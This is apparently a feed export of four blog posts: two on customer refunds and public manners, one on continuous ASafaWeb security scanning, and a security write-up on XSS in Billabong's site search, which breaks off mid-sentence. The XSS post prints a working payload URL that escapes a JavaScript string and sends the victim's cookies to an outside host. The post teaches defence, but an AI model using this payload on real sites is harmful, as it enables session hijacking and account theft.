Do I continue asking him about the problem or do I just refund him and remember that\"The Customer is Always Right\". What would you do?</p><p>One thing I know is that an unhappy customer, tended to correctly, will rapidly turn into one of your happiest customers. It's a gamble, especially when CAPS are invoked... but I pressed on.</p><blockquote><p><strong>Me</strong>: Listen I understand you're not happy but sometimes it comes down to knowing just a bit more about a problem and I can fix it - and often it makes people very happy. If you had the time to explain just a bit - I would really appreciate it. Your refund is on the way, by the way.</p></blockquote><p>This is one of my standard responses. Typically (not always) I will send the refund immediately. Upset people tend to become less upset, and then answer your questions. In this case, it worked out really well:</p><blockquote><p><strong>Customer</strong>: Sorry I should be a bit more clear. I<strong>love your videos</strong>and they're really good, but I can't afford the service and I thought I could but I just lost my job and I need to pull things back in. I didn't mean to be insulting and I guess I'm a bit stressed out. Thanks for the refund and if I get another job soon I'll come back.</p><p><strong>Me</strong>: No problem at all and thanks for letting me know this - it really does make a difference. XXXXXXXXX - that's a coupon for an Annual Subscription. Educating yourself will help find work and, if you want to pay me back,<a href=\"http://tekpub.com/gifts/new\">buy an annual for someone else</a>.</p></blockquote><p>Needless to say, the Customer was ecstatic and we solved the problem - something I would never have known about unless I pushed a little bit -<strong>pushed the Customer to let me help them</strong>.</p><p>I give stuff away constantly - especially to people who need it.</p><h2>This Backfires</h2><p>Just today - in fact it's the reason I'm writing this post - someone asked me for a refund. It was the first in 4 months and, as I do, I asked some questions first.</p><p>Many businesses adopt a\"No Questions Asked\" policy and I understand why - it's a blind guarantee and gives the appearance of standing squarely behind your product or service.</p><p>I find that this is short-sited but NOT because you shouldn't blindly guarantee your stuff, but<strong>it's more likely there's simply a misunderstanding happening, and you can FIX IT</strong>.</p><p>So anyway the Customer wanted a refund:</p><blockquote><p><strong>Customer</strong>: I want a refund for my monthly subscription because Pluralsight has more content than you.</p><p><strong>Me</strong>: They sure do, but I can't guarantee our stuff against another company's. I do know you'll be happy with what we offer because it's quite good and I notice you've only watched half of a single episode of all of our stuff. Might I recommend you give it some more time?</p><p><strong>Customer</strong>: I didn't ask you to guarantee Pluralsight - but you should do something to compare your stuff vs. theirs so people know the difference. Your refund policy states\"...'snip' ...\" Thus I'd like a refund.</p></blockquote><p>Here I have a problem. They haven't watched any of our stuff and are, essentially, having\"Buyer's Remorse\" as they saw more stuff at Pluralsight.<a href=\"http://pluralsight.com/training/Courses\">And Pluralsight has a whole lot of stuff</a>. Buyer's remorse and Pluralsight's catalog are not covered under our refund policy (as you can imagine) so...</p><p>If I keep pushing this angle, I'll lose. Pluralsight has an amazing library but there are differences in our content - I need to get that across as well as the main point:<strong>Why not have both!</strong>. It's $15 + $29 == $45/month. Think of what that means in terms of educating yourself and readying your career! Yet people scrutinize this expense as if it were some kind of luxury!</p><p>OK, so back to the matter at hand. How would you respond here? This is what I said:</p><blockquote><p><strong>Me:</strong>Our return policy covers what<strong>we create</strong>and if you don't like it, then yes we'll stand behind that. But you haven't tried it out yet and, forgive me if I'm misunderstanding here, you're asking for a refund because Pluralsight has more stuff.</p><p>I don't want unhappy customers and I'm sending your refund now - but when you get to Pluralsight you might not want to look at Lynda.com.</p><p>If you use Peepcode don't try CodeSchool or Treehouse. What you see as an advantage (more videos) is hardly a measure of the content (and its relevance to you). Either way, your refund is on its way\"</p></blockquote><p>I should have left that last part out. That was my ego, feeling bruised and frustration setting in because I felt that what they were asking for was not entirely fair.</p><p>And, as expected, the customer didn't like my response.<strong>Things started getting personal and I was told my Customer Service sucks</strong>(which wouldn't be the first time). The Customer ended things by saying\"I was planning on coming back to Tekpub if I didn't like Pluralsight but... not with this Customer Service experience\".</p><p>Which means I lose. Actually, we both lost because<a href=\"http://support.pluralsight.com/knowledgebase/articles/32815-what-is-your-refund-policy-\">I don't think he'll have the same option at Pluralsight</a>.</p><h2>Turning It Around. Or Turning It Off?</h2><p>I lost that battle because I tried to reason with someone who was unhappy - and that is almost always a bad idea. There are ways of asking questions that don't lead the Customer to believe they're being screwed or messed with - and I was trapped with this one.</p><p>They gave me money, and they regretted it even though they didn't even try what they paid for. To me,<strong>I was utterly convinced that if they tried our stuff, they'd love it</strong>and I kept trying to communicate that... but in the wrong way. I think I understand why many companies simply refuse to do refunds - it forces customers to consider a bit more carefully.</p><p>This is not to say that you shouldn't show Customers the door. I've had people (literally) try to extort me by\"taking it to Hacker News\" unless I refunded them for videos that my logs showed they were clearly sharing (multiple downloads to same IP over the period of a month). I asked them if it's OK to loop in their legal department, then I deleted their account and banned them.</p><p><strong>There are some customers you need to cut loose - basically a No Soup For You</strong>policy. They exist, it sucks, and it spoils it for customers who aren't Out To Get Your (to-date that's happened 5 times and I'm not happy about it... but it needed to happen).</p><p>On the bright side,<strong>I've managed to turn unhappy customers into Big Fans about 85% of the time: simply by asking questions and trying to care</strong>instead of following some old-school, outdated tome.</p></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=PZzbWDi8bww:AFQQEzd8wQo:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=PZzbWDi8bww:AFQQEzd8wQo:Q8R26LmAkSY\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=PZzbWDi8bww:AFQQEzd8wQo:Q8R26LmAkSY\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=PZzbWDi8bww:AFQQEzd8wQo:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=PZzbWDi8bww:AFQQEzd8wQo:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=PZzbWDi8bww:AFQQEzd8wQo:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=PZzbWDi8bww:AFQQEzd8wQo:F7zBnMyn0Lo\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/wekeroad/EeKc/~4/PZzbWDi8bww\" height=\"1\" width=\"1\"/>","author":"Rob Conery","_id":{"$wrap":"$oid","v":1125}}

It's the perfect shade of rich, deep oakey-brown that tells me I hit the right mixture of milk and sugar.</p><p>I'm looking over the hills from the upstairs walkway in front of my office door. Behind me, the door is open and work is waiting for me... in front of me the sun is poking through the golden morning clouds and the dew from the damp air is everywhere.</p><p>It's quiet, and I'm loving it.<strong>Until Garrett entered my life</strong>.</p><p>Well, it was Garrett's girlfriend, actually. It started with a low, shrill sound that came from around the parking lot. It was muffled somewhat but it sounded like someone in trouble. Naturally I looked around, thinking someone might need my help.</p><p>Then all of a sudden the volume increased dramatically as she got out of her car. She was in full hysterics, yelling into the phone about how Garrett was a FUCKING PIECE OF SHIT JERK ASSHOLE etc. etc.</p><p>She stood there for about 30 seconds in the parking lot that was filling with cars as people came to work. They walked past her, careful not to look.</p><p>After a while she slammed the door of her car and stormed upstairs. She works in the office next to mine. I decided to give her some space so I went inside and shut the door. She decided to stay outside and vent her rage over the entire parking lot, into the golden sunrise morning I was just enjoying.</p><p>She stayed there for 20 minutes, then went inside. I got to learn all about Garrett... who apparently is not a very nice person.</p><h2>Yeah Yeah Yeah</h2><p>4 weeks ago I took my family to Kalihiwai Beach where we like to go for barbeques with friends. It was a lovely night, the sun setting much the same way it comes up: golden light poking through swollen, puffed clouds full of warm rain.</p><p>6 of us were sitting around the tailgate of my truck, when right next to us pulls up a black Hummer with blinking blue lights underneath. It's a high-end\"situational\" rental car that is completely out of place here, on this beach in Hawaii. It's an LA ride that looks like the UFO it was apparently dropped from.</p><p>Out of the car comes a 30-something markety/dotcom guy. Thick glasses, tall and in shape. He's from LA - as am I - and we can smell it on each other. He tips his head back:\"SUP\".</p><p>We wave as he reaches back in his car and flips on, full volume,<a href=\"https://www.youtube.com/watch?v=umAL-6-j1Ew\">one of the worst remixes of one of the best Yeah Yeah Yeahs songs there is</a>. He opens the door wide - the one that faces us. He then goes to the back door and does the same... and then turns it up with a remote control in his pocket. All... the way... UP.</p><p>My chest thumps as the bass booms from inside. Purple beat-lights glow with the pulse of this horrible song as the trees ring with the echo of cheesy synth loops.</p><p>He's 20 feet away from us. There are no other cars on this half-mile stretch of beach. He's got this song on a loop so it plays... continually.</p><p>As opposed to Garrett's girlfriend, we didn't stand for it long. My buddy's wife casually went over and asked them to shut the doors facing us and to ... maybe open the doors facing them (no, really). They did, but not without giving stink eye.</p><h2>Bookended</h2><p>At lunch 3 months ago I sat at a table with a friend from out of town and a couple proceeded to get into a fight next to us. The lady stood up to storm away but thought of something clever so turned around just on the other side of us and, snappily, and let him have it. A lovely insult about his new car, flying right over the top of our heads and into his anger-laden face.</p><p>He fought back, she stayed put. We're square in the middle. I sat back and just listened - turning my head as if at an emotional tennis match between the two. The guy looked at me as if to say\"bug off\", I shrugged with my hands in the air (\"where should I go?\")... and they went outside... glaring back at me on the way.</p><h2>CONTEXT</h2><p>So many people are absolutely, stunningly unaware about the little bubble that surrounds them, defined by their thoughts, emotions and words. An interesting (and at the same time scary) thing is that groups of us share these things together - and our bubbles grow as we join into a group.</p><p>We walk around like pachinko balls ... bouncing our bubbles off someone else's. They either repel, or like bubbles, can join and grow larger. You can manage this process.</p><p>In a room full of other people, you have to manage that bubble of yours quite methodically - especially when you're with a group of friends having what you think is a private conversation.<strong>It almost never is</strong>.</p><p>That person sitting next to you on the bus/train/plane speaking really loudly into their cellphone? The new parents involving the entire restaurant in the little game they're playing with little Dylan? Or maybe the person in the front of the line who just now thought about looking at the menu and deciding what to eat...</p><p>Awareness. A Good Thing.</p><p>Whatever you're saying, thinking, emoting - all of it is shared with the people around you to some degree - even if they can't directly hear you. We're a sensitive animal and have senses built into us forged by millions of years of survival, intellect, and cunning. To pretend that words alone define meaning is complete folly.</p><p>Joking with your friend in a room full of diverse people isn't necessarily harmful, until you become blind to your own context as each of the people in the above stories were. Sometimes it doesn't matter. Other times it does.</p><p>You might be sitting next to someone who's sitting on an emotional grenade. That clever little joke you just made? It could be about guns, politics, gay marriage... or dongles. Well it might set that grenade off.</p><p>Call it professionalism, politeness, or just Old Fashioned Decency - it's why these things exist:<strong>so we can get along and avoid atomic swarm tendencies</strong>.</p><p>Until another person welcomes you into their context - no - you're not free (socially speaking) to do as you please without consequence. As much as you might feel you're protected by law to walk naked down the street singing that horrid Yeah Yeah Yeahs remix - your actions have an effect (and consequence) with others.</p><p>The same goes for being upset. Be aware of yourself and just how angry you've become. Think about why, and remember you're in public, around strangers. Think about your actions carefully in the way that the people in the story above did not.</p><p>This doesn't simply sit along gender lines (saying<a href=\"http://blog.8thlight.com/uncle-bob/2013/03/22/There-are-ladies-present.html\">There are Ladies Present</a>is a bit off the mark to me - the issue could as well have been racial or religious). I prefer to think<strong>there are other people present</strong>.</p><p>The only way to truly avoid the hell that can be other people is to understand the power of your own presence. Believe that you<strong>do</strong>have an effect on others.<strong>Just make it a positive one</strong>always.</p></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=ZagFlqH-NhI:tRZQf2khJVI:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=ZagFlqH-NhI:tRZQf2khJVI:Q8R26LmAkSY\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=ZagFlqH-NhI:tRZQf2khJVI:Q8R26LmAkSY\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=ZagFlqH-NhI:tRZQf2khJVI:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=ZagFlqH-NhI:tRZQf2khJVI:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=ZagFlqH-NhI:tRZQf2khJVI:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=ZagFlqH-NhI:tRZQf2khJVI:F7zBnMyn0Lo\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/wekeroad/EeKc/~4/ZagFlqH-NhI\" height=\"1\" width=\"1\"/>","author":"Rob Conery","_id":{"$wrap":"$oid","v":1127}}

What I mean by this is that it’s a continuous process and thinking that you only need to just implement some secure coding standards or scan the website once before go live leaves a great big hole in your process.</p><p>For example, the other day I wrote about how<a href=\"http://www.troyhunt.com/2013/05/security-is-hard-insecurity-is-easy.html\">insecurity is easy</a>where I talked about how Black and Decker had exposed ELMAH logs. This is the tiniest of security misconfigurations which can easily happen at any time but it meant that they ended up with the credentials from a significant portion of their customer base publicly accessible – ouch! Ok, this also involved storing plain text passwords in cookies in order to facilitate the “remember me” function (no, really), but the point is in how easy it was to make a simple change that blew a massive hole in the side of their security profile.</p><p>This brings me to the point of the post: security misconfiguration happens and you need to start looking for it bang after you publish the site. Exposed ELMAH logs is one thing but simple security misconfiguration changes you can screw up on release of an ASP.NET website go well beyond that; custom errors, tracing, request validation and the way your cookies are configured to name but a few. Each of these can be configured to leave a site vulnerable in literally just a few seconds.</p><p>For the last couple of years I’ve provided a service to detect these problems in a live site –<a href=\"https://asafaweb.com\">ASafaWeb</a>. The value proposition of ASafaWeb has always been that on demand, you can scan your live ASP.NET website and it will report on these security misconfigurations. Now I’m very happy to share how ASafaWeb has been integrated into<a href=\"https://oncheckin.com/\">OnCheckin</a>(the brainchild of<a href=\"http://www.diaryofaninja.com/\">Doug Rathbone</a>) to provide continuous deployment for ASP.NET websites as a cloud-based service.</p><p><img width=\"492\" height=\"101\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"OnCheckin - Cloud Powered Deployment\" src=\"http://lh4.ggpht.com/-QewvOaRCVAE/UcIqJJcxP2I/AAAAAAAAFa0/Lq_jFP5xOfA/OriginalLogo2.png?imgmax=800\" border=\"0\"></p><a name='more'></a><p>Here’s how it works: Firstly, you plug it into source control:</p><p><img width=\"791\" height=\"636\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Configuring source control\" src=\"http://lh3.ggpht.com/-9gS7OyP31vg/UcIqJ9H9scI/AAAAAAAAFa8/yVX3JMb2QA0/image2.png?imgmax=800\" border=\"0\"></p><p>Then you configure the deployment:</p><p><img width=\"785\" height=\"968\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Configuring deployment\" src=\"http://lh6.ggpht.com/-dLELbPIfWuk/UcIqKXe-9EI/AAAAAAAAFbE/pfNLEqbO4OA/image5.png?imgmax=800\" border=\"0\"></p><p>Then finally you review everything and tick the box to run the ASafaWeb scan after every deployment:</p><p><img width=\"788\" height=\"888\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Configuring ASafaWeb\" src=\"http://lh5.ggpht.com/-Uyoj7L3jeDU/UcIqLFxOwbI/AAAAAAAAFbM/wUxPb48a3ao/image31.png?imgmax=800\" border=\"0\"></p><p>That’s it – job done! Now each time the scan runs there’ll be a little ASafaWeb tab and a nice report on how the scan went:</p><p><img width=\"880\" height=\"522\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"The ASafaWeb report in OnCheckin\" src=\"http://lh3.ggpht.com/-xlPwH-zRX9Q/UcIqLwBN_AI/AAAAAAAAFbU/EtXZ9ZXtZWk/image11.png?imgmax=800\" border=\"0\"></p><p>What I really like about this is the continuous nature of the process. Every time that build runs, the site is going to get scanned and so long as you’re keeping an eye on the results you shouldn’t have sneaky security misconfigurations making their way through to production. Well at least not for very long!</p><p>The other thing about this integration is that it’s another step towards publicly releasing the ASafaWeb API. Yes, there’s an API and in fact it’s been used extensively as the magic behind the<a href=\"http://www.troyhunt.com/2012/08/welcome-to-asafaweb-scheduler.html\">ASafaWeb Scheduler</a>which gives you the ability to scan your sites on a regular basis (I mentioned it’s free, right?!). The intention has always been to open the API up for anyone to consume I reckon including it into the continuous integration cycle is a fantastic use-case.</p><p>To that effect, if you’re involved in a similar project and would like to integrate ASafaWeb then I’d love to hear from you. I’m happy to open it up to beta testers who want to contribute feedback and I know there are a<em>ton</em>of good ideas out there for how it might be used.</p><img src=\"http://feeds.feedburner.com/~r/TroyHunt/~4/0sjQHMWcphI\" height=\"1\" width=\"1\"/>","author":"Troy Hunt","_id":{"$wrap":"$oid","v":1128}}

You’ll very often see<em>some</em>attempt at mitigating the risk but then find it’s easily circumvented because the developers weren’t fully aware of the attack vectors.</p><p>Last week someone flicked me over a great example of this after having read my previous post<a href=\"http://www.troyhunt.com/2012/07/heres-why-we-keep-getting-hacked-clear.html\">Here’s why we keep getting hacked – clear and present Billabong failures</a>. In that post I pointed out the ease with which you could decorate Billabong’s registration page with the beautiful Miranda Kerr and a slightly stoned looking Bugs Bunny. In this post here, the ramifications of getting XSS wrong means stealing someone’s session and pulling out their personal details, all because of this:</p><p><img width=\"866\" height=\"534\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Stealing Billabong cookies\" src=\"http://lh3.ggpht.com/-HQJEtHP7vlU/UaZit9xh1KI/AAAAAAAAFYo/Zs_aoCI6mN4/image12.png?imgmax=800\" border=\"0\"></p><p>I’ll come back to that, let’s first go back to the title and focus on input sanitisation and output encoding contexts. If XSS is an entirely new concept to you, start by taking a look at<a href=\"http://www.troyhunt.com/2010/05/owasp-top-10-for-net-developers-part-2.html\">my post on it here</a>then come back to this one.</p><a name='more'></a><h4>Sanitising user input</h4><p>The theory goes like this: expect any untrusted data to be malicious. What’s untrusted data? Anything that originates from outside the system and you don’t have absolute control over so that includes form data, query strings, cookies, other request headers, data from<em>other</em>systems (i.e. from web services) and basically anything that you can’t be 100% confident doesn’t contain evil things.</p><p>Evil things can be SQL injection, malicious files, attempts to traverse internal directory structures or XSS payloads. So what do you do about untrusted data? You try and filter it out and there are two ways to approach this:</p><ol><li><strong>Blacklist:</strong>You describe everything you know is<em>bad</em>, for example you don’t allow a&lt;script&gt; tag or quotes. The trick here is that you have to comprehensively come up with everything that you think might be bad and add it to the blacklist. If untrusted data contains one of these bad patterns, you reject it.</li><li><strong>Whitelist:</strong>You describe everything you know is<em>good</em>, for example letters and numbers. The trick here is that you have to comprehensively come up with everything that you think might be legitimately provided by a user and allow it. If untrusted data is not entirely made up from patterns in the whitelist, you reject it.</li></ol><p>Whitelists are almost always preferable because they’re very explicit; only describing what you know to be good is a very discrete way of handling untrusted data. The problem with blacklists is that you don’t know what you don’t know. For example, you decide that double quotes are evil as they could be used to break out of an HTML attribute but later on realise that angle brackets could do the same thing in some browsers even though the HTML would be malformed. Or an entirely new attack vector raises its head.</p><p>Whitelists can be<em>very</em>simple, for example if you expect an integer or a GUID for an ID it’s very simple to typecast it and ensure it complies to that pattern. Likewise, a pattern such as a URL or an email address can be assessed against a regular expression rather than just accepting whatever the user provides. Things like people’s names are a little harder (many an Irishman has been rejected by sites that disallow single quotes), but there is much discussion and many examples of regexes that facilitate natural language characters and punctuation. Of course they also need to be conscious of things like non-Latin characters but again, this is an often held discussion with many examples of how to allow the good stuff while keeping out the bad stuff.</p><p>So let’s get back to Billabong and look at sanitisation. They follow a pretty tried and (kind of) trusted pattern of repeating the search term in the URL so that when you search for something like “shirt”, you see this:</p><p><img width=\"650\" height=\"400\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Search term reflected in page body\" src=\"http://lh6.ggpht.com/-dX-eaItsbvk/UaZiumJFu4I/AAAAAAAAFYw/fW6s0AG05F0/image15.png?imgmax=800\" border=\"0\"></p><p>However, search for something like “&lt;script&gt;” and you’ll get this:</p><p><img width=\"650\" height=\"198\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Search for&lt;script&gt; rejected by input sanitisation\" src=\"http://lh6.ggpht.com/-ktsqf97wKBY/UaZivY8OYVI/AAAAAAAAFY4/D3_dYJroc90/image18.png?imgmax=800\" border=\"0\"></p><p>Clearly there’s some sanitisation going on here, it’s just a question of whether it’s sufficient. If we modify that slightly we’ll see that if the leading angle bracket is dropped then the search goes through just fine:</p><p><img width=\"650\" height=\"320\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Search for script&gt; is allowed\" src=\"http://lh5.ggpht.com/-4s4wxEIS-zI/UaZiv5D_WSI/AAAAAAAAFZA/tUhk7Xcs0-s/image21.png?imgmax=800\" border=\"0\"></p><p>But hang on – why allow a greater than but not a less than? It’s starting to look like tag-blacklisting which per the definition above, is always going to be a bit dodgy. By process of elimination it’s easy to discover which characters are allowed through and beyond the obvious alphanumeric ones, they include<strong>:/\\’;”%.?</strong></p><p><img width=\"650\" height=\"320\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"A successful search for the characters :/\\’;”%.?\" src=\"http://lh6.ggpht.com/-cQ5ZuU2sDuM/UaZiwjAFipI/AAAAAAAAFZI/I7JWkkQUJ7I/image24.png?imgmax=800\" border=\"0\"></p><p>Some of those are punctuation which you might find in a product name someone would legitimately search for, but probably not characters like a double quote, a semicolon or a percent. Perhaps there are edge cases, but as we’re about to see, it’s the sort of thing you want to have a genuine need for before using.</p><h4>Output encoding contexts</h4><p>If you’re reading this, chances are you know what HTML markup looks like. For example, a paragraph tag is represented in markup as&lt;p&gt; (this is painfully obvious but bear with me). Thing is though, if you wanted to render that tag into the browser – just like I have here – then the actual markup is&lt;p&gt; where the angle brackets are represented by HTML escape characters. If they weren’t escaped then you’d literally end up with a paragraph tag in the markup and it wouldn’t be visible in the browser.</p><p>Let’s go back to Billabong and take a look at the lifecycle of the untrusted data that is the search term. Firstly, it’s actually only rendered into the source code in one location and that’s in JavaScript. When we searched for “shirt”, it ended up in this script block (see the second line):</p><pre class=\"code\"><span style=\"background: white; color: blue\">&lt;</span><span style=\"background: white; color: maroon\">script</span><span style=\"background: white; color: red\">type</span><span style=\"background: white; color: blue\">=\"text/javascript\"&gt;var</span><span style=\"background: white; color: black\">keyword =</span><span style=\"background: white; color: #a31515\">'shirt'</span><span style=\"background: white; color: black\">;</span><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">ProductSquareDefault =</span><span style=\"background: white; color: #a31515\">'/images/placeholder-{0}.jpg'</span><span style=\"background: white; color: black\">;</span><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">quantityMin = 1;</span><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">showOutOfStock =</span><span style=\"background: white; color: blue\">false</span><span style=\"background: white; color: black\">;</span><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">showProductsWithImageOnly =</span><span style=\"background: white; color: blue\">true</span><span style=\"background: white; color: black\">;</span><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">discount =</span><span style=\"background: white; color: blue\">null</span><span style=\"background: white; color: black\">;</span><span style=\"background: white; color: blue\">&lt;/</span><span style=\"background: white; color: maroon\">script</span><span style=\"background: white; color: blue\">&gt;</span></pre>It then got sent off to an API in the query string:<a title=\"https://au.shop.billabong.com/api/product/GetFiltersBySearchTerm?keyword=shirt&showSaleOnly=false\" href=\"https://au.shop.billabong.com/api/product/GetFiltersBySearchTerm?keyword=shirt&showSaleOnly=false\">https://au.shop.billabong.com/api/product/GetFiltersBySearchTerm?keyword=shirt&showSaleOnly=false<br></a><p>This API returns a JSON response with the results needed to build up the categories on the left under the search box (“Collections”, “Men”, “Women”, etc.) and then another API is called with the term in the query string again:<a href=\"https://au.shop.billabong.com/api/product/Search?filters=&keyword=shirt&showSaleOnly=false&buildLinks=true\">https://au.shop.billabong.com/api/product/Search?filters=&keyword=shirt&showSaleOnly=false&buildLinks=true</a></p><p>This then returns a<em>whopping</em>big JSON response of nearly 300kb (gzip, people!) with the individual results. All of this is orchestrated by a JavaScript file called<a href=\"https://au.shop.billabong.com/js/pages/search/search.js\">search.js</a>(minification, people!) which includes this piece of jQuery syntax:</p><pre class=\"code\"><span style=\"background: white; color: black\">$(</span><span style=\"background: white; color: #a31515\">'.search-form .searchkwd'</span><span style=\"background: white; color: black\">).val(keyword);</span></pre><p>The important thing in the context of output encoding is that this then sets the search term into the text box using the val() method in jQuery. This all happens in the DOM so there isn’t the same opportunity to exploit an XSS risk as if it was just reflected directly into the markup in the same way that we often see search features implemented. Yet there remains a risk…</p><p>Earlier we saw the word “shirt” appear in the JavaScript block which raises the question: is there any output encoding happening here? Let’s check by going back to one of the earlier searches which was for “script&gt;”. Here’s what we see:</p><pre class=\"code\"><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">keyword =</span><span style=\"background: white; color: #a31515\">'script&gt;'</span><span style=\"background: white; color: black\">;</span></pre><p>This is where the problem begins because there’s no encoding happening. Earlier on we talked about a greater than sign encoding to&gt; in HTML, what you have to remember is that in JavaScript it’s a totally different syntax and what you need there is \\x3c or in other words, this is what the script<em>should</em>look like:</p><pre class=\"code\"><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">keyword =</span><span style=\"background: white; color: #a31515\">'script\\x3c'</span><span style=\"background: white; color: black\">;</span></pre><p>That’s now enough to establish there’s an exploitable risk on the site, let’s look at how that might happen.</p><h4>Exploiting unsanitised data with unencoded output</h4><p>Remembering that the character<strong>:/\\’;”%.?</strong>are all allowed through the sanitisation and that it looks like they’ll happily be rendered as-is to the JavaScript context, the question now becomes “what can we do with this”? This a site that can be authenticated to and given that authenticated sessions on websites are almost always persisted by authentication cookies, let’s take a look at those. Of course there is a native browser defence against accessing cookies on the client side cookies and I wrote about it recently in<a href=\"http://www.troyhunt.com/2013/03/c-is-for-cookie-h-is-for-hacker.html\">C is for cookie, H is for hacker – understanding HTTP only and Secure cookies</a>.</p><p>That native defence is the HttpOnly cookie and when a cookie is flagged as such, it can’t be grabbed by JavaScript. However, here are Billabong’s cookies:</p><p><img width=\"688\" height=\"369\" title=\"image\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; margin: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"image\" src=\"http://lh5.ggpht.com/-LAFGSnIMJa0/UaZixGVC22I/AAAAAAAAFZQ/0rL3kL8vyew/image27.png?imgmax=800\" border=\"0\"></p><p>There is only one HttpOnly cookie and it’s the ASP.NET_SessionId which is HttpOnly by default. Given this is an ASP.NET app it’s also worth pointing out that were this site to be using the framework’s implementation of forms authentication we’d see a .ASPXAUTH cookie for persisting the authenticated session and it<em>would</em>be flagged as HttpOnly. Instead we see the highlighted CustomerSession cookie which is all that’s needed to steal the session – and it’s not HttpOnly. This is<em>precisely</em>why you’ll often hear people (myself included) say how it important it is to use existing, proven security implementations.</p><p>So that tells us enough to know that there’s something useful to be gained by grabbing cookies. Get that from a logged in user and you can become them. Let’s try this URL:<a title=\"https://au.shop.billabong.com/search?keyword=\\';location.href=\"http://hackyourself.troyhunt.com/Cookies/?c=\"%2BencodeURIComponent(document.cookie);//\" href=\"https://au.shop.billabong.com/search?keyword=\\';location.href=\"http://hackyourself.troyhunt.com/Cookies/?c=\"%2BencodeURIComponent(document.cookie);//\">https://au.shop.billabong.com/search?keyword=\\';location.href=\"http://hackyourself.troyhunt.com/Cookies/?c=\"%2BencodeURIComponent(document.cookie);//</a></p><p>You may be able to guess what’s in there but it makes a lot more sense when you see it rendered – without any output encoding – to the source of the page:</p><pre class=\"code\"><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">keyword =</span><span style=\"background: white; color: #a31515\">'\\''</span><span style=\"background: white; color: black\">; location.href =</span><span style=\"background: white; color: #a31515\">\"http://hackyourself.troyhunt.com/Cookies/?c=\"</span><span style=\"background: white; color: black\">+ encodeURIComponent(document.cookie);</span><span style=\"background: white; color: green\">//';</span></pre><p>Make sense now? It breaks down into three parts:</p><ol><li>Close off the keyword variable assignment and terminate the statement.</li><li>Redirect the browser to my website along with all the URL encoded cookies that the browser can access (anything not flagged as HttpOnly).</li><li>Comment out the remaining statement (this is the characters normally used to close off the keyword string and terminate the statement).</li></ol><p>As a result of this, I now have your cookies and that includes your session ID:</p><p><img width=\"866\" height=\"534\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Stealing Billabong cookies\" src=\"http://lh4.ggpht.com/-QFj9UGnEAXI/UaZix9ZiQzI/AAAAAAAAFZY/D7g_pzhNElA/image31.png?imgmax=800\" border=\"0\"></p><p>Of course I (or an attacker) need to be able to get a victim to follow a link with the XSS payload in it<em>and</em>make sure it’s a victim that’s actually 